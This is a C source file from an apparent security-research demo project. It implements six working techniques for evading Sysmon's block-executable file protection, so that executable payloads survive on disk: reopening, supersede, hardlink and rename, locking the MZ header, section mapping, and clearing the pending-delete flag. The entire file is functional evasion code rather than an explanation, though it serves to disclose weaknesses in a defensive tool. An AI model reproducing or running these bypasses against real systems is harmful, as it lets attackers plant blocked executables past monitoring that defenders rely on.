/*
 * Copyright (c) 2022 Hunt & Hackett.
 *
 * This demo project is licensed under the MIT license.
 *
 * Authors:
 *     diversenok
 *
 */

#include "bypass_block_executable.h"

 // Non-bypass #0: create, write, close (test mode; Sysmon should delete the file)
NTSTATUS H2SysmonNonBypassViaCreate(
    _In_reads_bytes_(DataSize) PVOID Data,
    _In_ ULONG DataSize,
    _In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
    NTSTATUS status;
    HANDLE hFile = NULL;
    HANDLE hFileForTracking = NULL;

    // Create the target file from scratch
    status = H2CreateFile(
        &hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open the file for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write the payload
    status = H2WriteFile(
        hFile,
        Data,
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Trigger Sysmon's checks
    NtClose(hFile);
    hFile = NULL;

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    return status;
}

// Bypass #1: create, close; open, write, close
NTSTATUS H2SysmonBypassViaCreatePlusOpen(
	_In_reads_bytes_(DataSize) PVOID Data,
	_In_ ULONG DataSize,
	_In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
	NTSTATUS status;
    HANDLE hFile = NULL;
    HANDLE hFileForTracking = NULL;

    // Create the file from scratch
    status = H2CreateFile(
        &hFile,
        SYNCHRONIZE,
        FileName,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open the file for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Trigger Sysmon's checks (1)
    NtClose(hFile);
    hFile = NULL;

    // Open it again for writing
    status = H2CreateFile(
        &hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write the payload
    status = H2WriteFile(
        hFile,
        Data, 
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Trigger Sysmon's checks (2)
    NtClose(hFile);
    hFile = NULL;

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    return status;
}

// Bypass #2: supersede, write, close
NTSTATUS H2SysmonBypassViaSupersede(
    _In_reads_bytes_(DataSize) PVOID Data,
    _In_ ULONG DataSize,
    _In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
    NTSTATUS status;
    HANDLE hFile = NULL;
    HANDLE hFileForTracking = NULL;

    // Create the file using the supersede semantics
    status = H2CreateFile(
        &hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_SUPERSEDE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open the file for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write the payload
    status = H2WriteFile(
        hFile,
        Data,
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Trigger Sysmon's checks
    NtClose(hFile);
    hFile = NULL;

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    return status;
}

// Bypass #3: create, write, hardlink, close
NTSTATUS H2SysmonBypassViaHardlink(
    _In_reads_bytes_(DataSize) PVOID Data,
    _In_ ULONG DataSize,
    _In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
    NTSTATUS status;
    ULONG linkInfoSize = 0;
    PFILE_LINK_INFORMATION linkInfo = NULL;
    HANDLE hFile = NULL;
    HANDLE hFileForTracking = NULL;

#define LINK_SUFFIX L"_link"    

    // Create file #1
    status = H2CreateFile(
        &hFile,
        FILE_WRITE_DATA | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE,
        FileName,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open the file #1 for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write data via file #1
    status = H2WriteFile(
        hFile,
        Data,
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Allocate the hardlink information
    linkInfoSize = sizeof(FILE_LINK_INFORMATION) + FileName->Length + sizeof(LINK_SUFFIX);
    status = H2Allocate(linkInfoSize, &linkInfo, HEAP_ZERO_MEMORY);

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    linkInfo->ReplaceIfExists = FALSE;
    linkInfo->RootDirectory = NULL;
    linkInfo->FileNameLength = FileName->Length + sizeof(LINK_SUFFIX) - sizeof(UNICODE_NULL);

    // Make the hardlink name start with the filename
    UNICODE_STRING linkName;
    linkName.Buffer = linkInfo->FileName;
    linkName.MaximumLength = (USHORT)(linkInfo->FileNameLength + sizeof(UNICODE_NULL));
    linkName.Length = FileName->Length;
    RtlCopyMemory(linkName.Buffer, FileName->Buffer, FileName->Length);

    // Append the hardlink name suffix
    status = RtlAppendUnicodeToString(&linkName, LINK_SUFFIX);

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Create the hardlink (file #2)
    IO_STATUS_BLOCK isb;

    LastCall = L"NtSetInformationFile [FileLinkInformation]";
    status = NtSetInformationFile(
        hFile,
        &isb,
        linkInfo,
        linkInfoSize,
        FileLinkInformation
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Close the original file to trigger Sysmon's checks
    NtClose(hFile);
    hFile = NULL;

    // Open the hardlink file for renaming
    status = H2CreateFile(
        &hFile,
        DELETE | SYNCHRONIZE,
        &linkName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Rename the hardlink to to use the original name
    status = H2RenameFile(
        hFile,
        FileName,
        TRUE
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

    status = STATUS_SUCCESS;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    if (linkInfo)
        H2Free(linkInfo);

    return status;
}

// Bypass #4: create, write, open, lock, close, unlock, close
NTSTATUS H2SysmonBypassViaLocking(
    _In_reads_bytes_(DataSize) PVOID Data,
    _In_ ULONG DataSize,
    _In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
    NTSTATUS status;
    HANDLE hFile = NULL;
    HANDLE hFileForLock = NULL;
    HANDLE hFileForTracking = NULL;

    // Create the file the usual way
    status = H2CreateFile(
        &hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open it again for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write the payload
    status = H2WriteFile(
        hFile,
        Data,
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open the file for locking
    status = H2CreateFile(
        &hFileForLock,
        FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Lock the first two bytes of the DOS header
    IO_STATUS_BLOCK isb;
    LARGE_INTEGER byteOffet;
    LARGE_INTEGER length;

    byteOffet.QuadPart = 0;
    length.QuadPart = 2; // length of MZ

    LastCall = L"NtLockFile";
    status = NtLockFile(
        hFileForLock,
        NULL,
        NULL,
        NULL,
        &isb,
        &byteOffet,
        &length,
        0,
        TRUE,
        TRUE
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Close the original handle to trigger Sysmon's checks
    NtClose(hFile);
    hFile = NULL;

    // Release the lock
    NtUnlockFile(
        hFileForLock,
        &isb,
        &byteOffet,
        &length,
        0
    );

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

    status = STATUS_SUCCESS;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForLock)
        NtClose(hFileForLock);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    return status;
}

// Bypass #5: create, write, map, close, unmap
NTSTATUS H2SysmonBypassViaMapping(
    _In_reads_bytes_(DataSize) PVOID Data,
    _In_ ULONG DataSize,
    _In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
    NTSTATUS status;
    HANDLE hFile = NULL;
    HANDLE hFileForTracking = NULL;
    HANDLE hSection = NULL;

    // Create the target file
    status = H2CreateFile(
        &hFile,
        FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open it again for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write the payload
    status = H2WriteFile(
        hFile,
        Data,
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Create a memory projection from the file.
    // Note that we don't even need to map it to prevent file deletion.
    LastCall = L"NtCreateSection";
    status = NtCreateSection(
        &hSection,
        SECTION_ALL_ACCESS,
        NULL,
        NULL,
        PAGE_READWRITE,
        SEC_COMMIT,
        hFile
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Trigger Sysmon's checks
    NtClose(hFile);
    hFile = NULL;

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

    status = STATUS_SUCCESS;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    if (hSection)
        NtClose(hSection);

    return status;
}

// Bypass #6: create, write, close, clear pending deletion
NTSTATUS H2SysmonBypassViaUndeleting(
    _In_reads_bytes_(DataSize) PVOID Data,
    _In_ ULONG DataSize,
    _In_ PUNICODE_STRING FileName,
    _Out_ PHANDLE FileMonitorHandle
)
{
    NTSTATUS status;
    HANDLE hFile = NULL;
    HANDLE hFileForUndelete = NULL;
    HANDLE hFileForTracking = NULL;

    // Create the target file
    status = H2CreateFile(
        &hFile,
        FILE_WRITE_DATA | SYNCHRONIZE,
        FileName,
        FILE_CREATE,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open it again for tracking changes
    status = H2CreateFile(
        &hFileForTracking,
        SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Write the payload
    status = H2WriteFile(
        hFile,
        Data,
        DataSize
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Open the file again for undeleting
    status = H2CreateFile(
        &hFileForUndelete,
        DELETE | SYNCHRONIZE,
        FileName,
        FILE_OPEN,
        FILE_SYNCHRONOUS_IO_NONALERT
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Close the original handle to trigger Sysmon's checks
    NtClose(hFile);
    hFile = NULL;

    // Clear the pending deletion flag, in case the file was marked as such
    IO_STATUS_BLOCK isb;
    FILE_DISPOSITION_INFORMATION dispositionInfo;
    dispositionInfo.DeleteFile = FALSE;

    LastCall = L"NtSetInformationFile [FileDispositionInformation]";
    status = NtSetInformationFile(
        hFileForUndelete,
        &isb,
        &dispositionInfo, 
        sizeof(dispositionInfo),
        FileDispositionInformation
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;
    
    // Rename the file back, in case it was archived
    status = H2RenameFile(
        hFileForUndelete,
        FileName,
        TRUE
    );

    if (!NT_SUCCESS(status))
        goto CLEANUP;

    // Transfer the ownership of the tracking file
    *FileMonitorHandle = hFileForTracking;
    hFileForTracking = NULL;

    status = STATUS_SUCCESS;

CLEANUP:
    if (hFile)
        NtClose(hFile);

    if (hFileForUndelete)
        NtClose(hFileForUndelete);

    if (hFileForTracking)
        NtClose(hFileForTracking);

    return status;
}